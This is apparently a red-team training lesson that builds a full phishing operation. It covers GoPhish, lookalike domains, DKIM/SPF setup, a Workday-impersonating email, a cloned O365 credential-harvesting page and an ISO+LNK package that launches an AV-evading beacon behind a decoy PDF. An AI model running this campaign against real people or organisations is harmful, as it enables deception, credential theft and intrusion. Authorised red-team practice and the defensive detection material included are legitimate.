---
title: "Phishing Campaign Full Lab — GoPhish, Email Infrastructure, Payload Delivery"
tags: [red-team, phishing, GoPhish, email, DKIM, SPF, macro, payload-delivery,
  credential-harvesting, ATT&CK, T1566.001, T1566.002]
module: 08-RedTeam-02
day: 505
related_topics:
  - Physical and Social Engineering (Day 504)
  - Full Kill-Chain Lab Day 1 (Day 506)
  - AV and EDR Evasion Concepts (Day 494)
  - Payload Development (Day 496)
---

# Day 505 — Phishing Campaign Full Lab

> "Phishing is not clicking a link. Phishing is an end-to-end operation:
> infrastructure, pretext, lure, payload, tracking, and cleanup. Most red
> teams treat it as a checkbox. The ones who get consistent results treat
> it like a product launch. Everything is tested. The email renders
> correctly in Outlook and Gmail. The payload survives Defender. The
> landing page looks real. That is craft."
>
> — Ghost

---

## Goals

Build a complete phishing campaign infrastructure: GoPhish, SMTP relay, and
DKIM/SPF configuration.
Design a convincing spearphishing lure grounded in OSINT.
Deliver a payload that survives static AV detection.
Track results: open rate, click rate, credential capture, payload execution.

**Prerequisites:** Day 504 (social engineering), Day 496 (payload development),
Day 494 (evasion concepts), OSINT (Days 51–62).
**Time budget:** 6–8 hours.

---

## Part 1 — Phishing Infrastructure Setup

A professional phishing campaign uses purpose-built infrastructure, not your
C2 server or personal email. The domains, servers, and email configuration are
separate from anything that can be traced back to your team or the target.

### Domain Selection

```
Requirements:
  → Aged domain (registered 30+ days before the campaign)
  → Category-matched to the lure (technology vendor, HR platform, etc.)
  → Not on any blocklist (check: mxtoolbox.com, talos intelligence)
  → TLD that matches the target industry (.com is universal; .io for tech targets)

Typosquatting/lookalike patterns:
  corp.com → corp-secure.com (plausible IT security alert)
  payroll.corp.com → corp-payroll.com (HR lure)
  microsoft.com → micros0ft-support.com (do not use in real ops — too obvious)
  vendor-name + "portal" / "login" / "secure"

Register via: Namecheap (privacy protection), Porkbun
DNS hosting: Cloudflare (fast propagation, free)
```

### VPS and GoPhish Setup

```bash
# Deploy a separate VPS for phishing (not the C2 server):
# Recommended: DigitalOcean, Vultr, Linode (separate account from C2 infra)

# Install GoPhish:
wget https://github.com/gophish/gophish/releases/download/v0.12.1/gophish-v0.12.1-linux-64bit.zip
unzip gophish-v0.12.1-linux-64bit.zip
chmod +x gophish

# Configure config.json:
{
  "admin_server": {
    "listen_url": "127.0.0.1:3333",  # Admin only on localhost — never public
    "use_tls": true,
    "cert_path": "admin.crt",
    "key_path": "admin.key"
  },
  "phish_server": {
    "listen_url": "0.0.0.0:443",
    "use_tls": true,
    "cert_path": "/etc/letsencrypt/live/corp-secure.com/fullchain.pem",
    "key_path": "/etc/letsencrypt/live/corp-secure.com/privkey.pem"
  }
}

# Get TLS cert for the phishing domain:
certbot certonly --standalone -d corp-secure.com

# Run GoPhish:
./gophish &
# Access admin panel: https://127.0.0.1:3333  (SSH tunnel from attacker machine)
```

### Email Infrastructure (SMTP + DKIM/SPF)

```bash
# Option 1: SendGrid (simplest, reliable delivery)
# Register account, verify the phishing domain, get API key
# Configure in GoPhish: Sending Profile → SendGrid SMTP

# Option 2: Self-hosted Postfix (more control, more setup)
apt install postfix opendkim opendkim-tools

# Generate DKIM key pair:
mkdir /etc/opendkim/keys/corp-secure.com
opendkim-genkey -D /etc/opendkim/keys/corp-secure.com/ -d corp-secure.com -s mail

# Configure DNS records for corp-secure.com:
# TXT: v=spf1 ip4:YOUR_VPS_IP ~all
# TXT: mail._domainkey.corp-secure.com = "v=DKIM1; k=rsa; p=PUBLIC_KEY"
# TXT: _dmarc.corp-secure.com = "v=DMARC1; p=none; rua=mailto:dmarc@corp-secure.com"

# Verify:
nslookup -type=TXT corp-secure.com
dig TXT mail._domainkey.corp-secure.com
# → DKIM and SPF records must resolve before sending any email

# Test deliverability:
swaks --to test@gmail.com --from noreply@corp-secure.com \
    --server mail.corp-secure.com --port 587 \
    --auth-user mailuser --auth-password PASSWORD \
    --tls --body "Test delivery"
# Check spam score: mail-tester.com (score above 8/10 before real campaign)
```

---

## Part 2 — Lure Design

The lure is the email content and landing page. It must be believable for the
specific target — use OSINT to build context.

### OSINT-Driven Lure Research

```
For the target organisation, find:
  → Current IT systems (from job postings, LinkedIn profiles)
  → Recent announcements (new system rollout, merger, policy change)
  → Vendor relationships (Workday for HR, ServiceNow for IT, Okta for SSO)
  → Seasonal context (tax season → IRS/payroll; open enrollment → benefits)

Example lure premise (grounded in OSINT):
  "Target recently posted a job for 'Workday Administrator.'
   Lure: 'Workday system maintenance notification — re-authenticate your session.'
   Landing page: a Workday login page clone at workday-corp-secure.com.
   Payload: the 'Workday installer' they must download to 'complete verification.'"
```

### Email Template (GoPhish)

```html
<!-- GoPhish email template — "Workday Session Expiry" -->
Subject: [ACTION REQUIRED] Workday Session Expires in 24 Hours

From: Workday IT Support <noreply@corp-secure.com>
Reply-To: workday-support@corp-secure.com

Dear {{.FirstName}},

Your Workday session is scheduled to expire within 24 hours as part of our
quarterly security maintenance cycle. To avoid disruption to payroll and
time-off request access, please re-authenticate your account at your earliest
convenience.

<a href="{{.URL}}">Click here to re-authenticate your Workday account</a>

If you believe you received this message in error, please contact the IT Help
Desk at +1 (555) 123-4567 or reply to this email.

Thank you,
Workday IT Support Team
Corp Technologies Group

--
This is an automated message. Please do not reply directly to this address.
```

### GoPhish Tracking Tokens

```
GoPhish auto-injects:
  {{.FirstName}}  → personalised first name
  {{.Email}}      → target email address
  {{.URL}}        → unique tracking URL (includes campaign + recipient ID)
  {{.RId}}        → recipient ID (links click events to target)

Every link click and credential submission is logged per-target.
```

---

## Part 3 — Landing Page and Credential Capture

```
Landing page options:

Option A: Credential harvesting (GoPhish built-in):
  Clone the target SSO/OWA/Workday login page
  GoPhish captures username + password on form submission
  Optionally redirect to the real login page after capture ("transparent phishing")

Option B: Payload delivery (file download):
  Landing page offers a "mandatory software installer"
  The download is a payload (ISO, ZIP, LNK) that executes when opened
```

### Cloning a Login Page

```bash
# Use GoPhish's built-in site importer:
# GoPhish Admin → Landing Pages → New → Import Site
# URL: https://login.microsoftonline.com  (or the target's Workday/OWA URL)
# GoPhish downloads the HTML, CSS, and images

# Edit the cloned page:
# 1. Update the form action to post to GoPhish (already done by importer)
# 2. Add redirect after submit: window.location = "https://real-login-page.com"
# 3. Remove any JavaScript that would reveal the phishing domain
```

---

## Part 4 — Payload Delivery via Phishing

Credential phishing captures SSO passwords. If MFA is in use or DA access is
the goal, deliver a payload instead.

### Payload Types and Detection Rates (2026)

```
Payload type          AV detection    Execution friction  Notes
────────────────────────────────────────────────────────────────
.docm (macro)         High            Low (familiar)      MOTW blocks by default
.xlsm (macro)         High            Low                 Same
ISO → LNK             Medium          Low                 Mounts as a drive
ZIP → LNK             Medium          Low (double-click)  Common bypass
.hta (MSHTA)          High            Low                 Defender catches most
.pdf → JavaScript     High            High (needs Acrobat) Rarely used now
OneNote → script      Medium          Low (one click)     Effective in 2023-24
Signed binary lure    Low             Medium              Custom binary needed
```

### ISO + LNK Payload (Current Recommended Approach)

```bash
# Step 1: Build the payload (from Day 496 — XOR-encrypted shellcode runner)
# Assume: runner.exe is the Sliver beacon executable, Defender-evading

# Step 2: Create an LNK that runs the payload and opens a decoy document:
# PowerShell:
$WshShell = New-Object -ComObject WScript.Shell
$Shortcut = $WshShell.CreateShortcut("Workday_Installer.lnk")
$Shortcut.TargetPath = "C:\Windows\System32\cmd.exe"
$Shortcut.Arguments = '/c start runner.exe && start Workday_Release_Notes.pdf'
$Shortcut.IconLocation = "C:\Windows\System32\imageres.dll,72"  # looks like an installer
$Shortcut.Save()

# Step 3: Create an ISO containing both the LNK and decoy PDF:
mkisofs -o Workday_Q4_2026_Update.iso runner.exe Workday_Installer.lnk \
    Workday_Release_Notes.pdf

# Step 4: Host the ISO on the GoPhish landing page as the download

# User flow:
# → Clicks link in email
# → Lands on phishing page → "Download Required: Workday Installer"
# → Downloads ISO → mounts automatically in Windows 10/11
# → Sees "Workday_Installer.lnk" — double-clicks
# → runner.exe executes → Sliver beacon phones home
# → Decoy PDF opens → user thinks it was legitimate
```

---

## Part 5 — Campaign Execution and Tracking

### GoPhish Campaign Setup

```
Admin Panel → Campaigns → New Campaign

Name:          Corp_Workday_Q1
Template:      (select email template from Part 2)
Landing Page:  (select landing page from Part 3)
Sending Profile: (select SMTP profile from Part 1)
Launch Date:   Tuesday-Thursday, 9am-11am local time (highest open rates)
Send Emails By: +4 hours from launch (spread to avoid spam filters)

Groups:
  Import target list CSV:
  First Name, Last Name, Email, Position
  John,       Smith,     jsmith@corp.com, IT Manager
  ...
```

### Metrics to Track

```
Open rate:       emails opened / emails sent
  Goal: >25%   (lower = subject line or sender failed)

Click rate:      links clicked / emails opened
  Goal: >15%   (lower = email content or lure failed)

Credential rate: creds submitted / links clicked
  Goal: >30%   (lower = landing page not convincing)

Payload rate:    payloads executed / downloads
  Goal: >50%   (lower = AV caught it or friction too high)

Time to first:   time from send to first click/execution
  Note: >24h = most users are not going to click
```

---

## ATT&CK Mapping

| Technique | ATT&CK ID | Detection signal |
|---|---|---|
| Spearphishing with attachment | T1566.001 | Email gateway: new attachment type |
| Spearphishing with link | T1566.002 | Proxy: click on newly-registered domain |
| ISO/LNK payload delivery | T1204.002 | Sysmon Event 1: LNK parent of cmd.exe |
| Credential phishing | T1056.003 | Web proxy: POST to external phishing domain |

---

## Key Takeaways

1. DKIM, SPF, and DMARC are required for reliable email delivery. Without them,
   most modern email gateways will quarantine or reject your messages before
   the target sees them. Set them up first; test delivery before the campaign.
2. The ISO + LNK payload delivery method bypasses Mark-of-the-Web (MOTW) on
   Windows 10/11 because the ISO mount point removes the MOTW zone identifier
   from contained files. As of late 2022, Microsoft partially patched this —
   test against the target's patch level.
3. Track every metric per-target, not just in aggregate. A SOC analyst who
   clicked on Tuesday at 09:14 but did not submit credentials is not a success
   — it is a burned detection opportunity. Review per-recipient reports.
4. The decoy document must open. A user who clicks, sees nothing happen, and
   then reports it to IT is worse than a user who never clicked. The decoy
   buys you time.
5. Clean up after the campaign. Deregister the phishing domain or point it
   somewhere harmless. Delete the GoPhish server. Remove captured credentials
   from your systems after the report is delivered.

---

## Exercises

1. Set up GoPhish on a lab VPS. Configure a self-signed cert for the admin
   panel. Create a basic email template with a tracking pixel (1×1 image from
   GoPhish). Send a test to your own email. Verify the open event appears in
   GoPhish.
2. Clone the Microsoft O365 login page using GoPhish's site importer. Submit
   test credentials. Verify they appear in the GoPhish results. Add a redirect
   to the real Microsoft login page after submission.
3. Build an ISO + LNK payload where the LNK executes `calc.exe` (safe stand-in
   for a beacon) and opens a PDF. Test on a Windows 11 VM with Defender enabled.
   Record whether Defender catches the LNK execution.
4. Write a phishing detection Sigma rule for a web proxy log that fires when
   a user's browser submits a POST request to a domain registered in the last
   30 days that was reached by clicking a link in an email.

---

## Questions

> Add your questions here. Each question gets a Global ID (Q505.1, Q505.2 …).

---

## Navigation

← Previous: [Day 504 — Physical and Social Engineering](DAY-0504-Physical-and-Social-Engineering.md)
→ Next: [Day 506 — Full Kill-Chain Lab Day 1](DAY-0506-Full-Kill-Chain-Lab-Day-1.md)
